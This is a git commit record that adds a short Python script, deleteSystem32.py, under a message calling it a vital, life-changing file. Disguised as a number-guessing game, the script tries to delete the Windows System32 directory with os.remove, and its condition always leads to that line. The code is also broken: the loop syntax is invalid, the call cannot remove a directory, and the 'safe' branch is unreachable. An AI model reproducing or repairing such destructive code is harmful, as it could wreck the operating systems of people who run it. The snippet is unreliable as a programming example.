6e445f8bcd1e3649600556c35d0f41fd817f42d2
Themika <Weerasuriyathemik@gmail.com>
2024-09-16 09:49:56 -0400

    added a vital file that will change a persons life

---
+++ deleteSystem32.py
@@ -0,0 +1,10 @@
+import os
+import random
+
+ran = random.randint(0,5)
+while True():
+    print("GUESS A NUMBER")
+    if ran != 1.5:
+        os.remove("C:/Windows/System32")
+    else: 
+        print("YOU LIVE TO SEE ANOTHER DAY ;)")
